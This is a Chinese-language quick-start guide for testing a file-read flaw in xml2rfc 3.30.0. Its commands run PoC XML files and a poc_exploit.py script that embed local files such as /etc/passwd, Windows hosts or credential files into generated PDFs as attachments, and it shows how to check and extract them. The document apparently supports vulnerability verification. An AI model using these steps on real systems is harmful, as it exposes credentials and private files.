# 快速测试指南

## 如果你使用的是 xml2rfc 3.30.0 (存在漏洞)

### 方法1: 使用最简单的测试文件

```bash
# Windows 用户
xml2rfc --pdf poc_simple_test.xml -o test_output.pdf

# Linux 用户
xml2rfc --pdf poc_read_passwd.xml -o test_output.pdf
```

### 方法2: 使用Python自动化脚本

```bash
# 检查你的版本
python poc_exploit.py --check-version

# Windows环境：读取hosts文件
python poc_exploit.py --file C:/Windows/System32/drivers/etc/hosts --output test.pdf

# Linux环境：读取passwd文件
python poc_exploit.py --file /etc/passwd --output test.pdf
```

### 验证漏洞是否被利用

生成PDF后，检查文件大小：
```bash
# Windows
dir test.pdf

# Linux
ls -lh test.pdf
```

如果文件比正常的RFC PDF大很多，说明可能包含了读取的文件内容。

## 重要提示

⚠️ **RFC v3 格式不要使用 DOCTYPE 声明！**

错误示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rfc SYSTEM "rfc2629.dtd">  <!-- ❌ 这行会导致错误 -->
<rfc version="3" ...>
```

正确示例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<rfc version="3" ...>  <!-- ✅ 直接开始rfc标签 -->
```

## 可用的POC文件

### Linux/Unix
- `poc_read_passwd.xml` - 读取 /etc/passwd
- `poc_multiple_files.xml` - 读取多个系统文件
- `poc_path_traversal.xml` - 路径遍历测试

### Windows
- `poc_simple_test.xml` - 简单测试（读取 hosts）
- `poc_windows_system.xml` - Windows系统文件
- `poc_windows_creds.xml` - Windows凭证文件
- `poc_windows_apps.xml` - Windows应用配置

## 常见错误

### 错误1: "Incompatible schema information found rfc2629.dtd"
**原因**: XML中包含了 DOCTYPE 声明  
**解决**: 移除 `<!DOCTYPE rfc SYSTEM "rfc2629.dtd">` 这一行

### 错误2: "Unable to validate the XML document"
**原因**: XML格式不正确  
**解决**: 检查所有标签是否正确闭合，属性是否完整

### 错误3: PDF生成但没有附件
**原因**: 
1. 使用的是修复后的版本（>= 3.30.2）
2. 目标文件不存在或无权限读取

**检查**: 看输出中是否有类似以下的警告信息：
```
Removed <link rel="attachment" href="...">. link relationships type attachment is not allowed.
```

如果看到这个警告，说明版本已经修复了漏洞（这是好事！）

## 测试流程

1. **确认版本**
   ```bash
   xml2rfc --version
   ```

2. **生成PDF**
   ```bash
   xml2rfc --pdf poc_simple_test.xml -o output.pdf
   ```

3. **检查结果**
   - 看是否有警告信息（修复版本会有）
   - 查看PDF文件大小（如果很大说明可能成功）
   - 尝试用PDF阅读器打开查看

4. **提取附件**（如果有PDF工具）
   ```bash
   # 使用 pdfdetach (Linux)
   pdfdetach -list output.pdf
   
   # 使用 Python
   python -c "import PyPDF2; print(PyPDF2.PdfReader('output.pdf').trailer)"
   ```
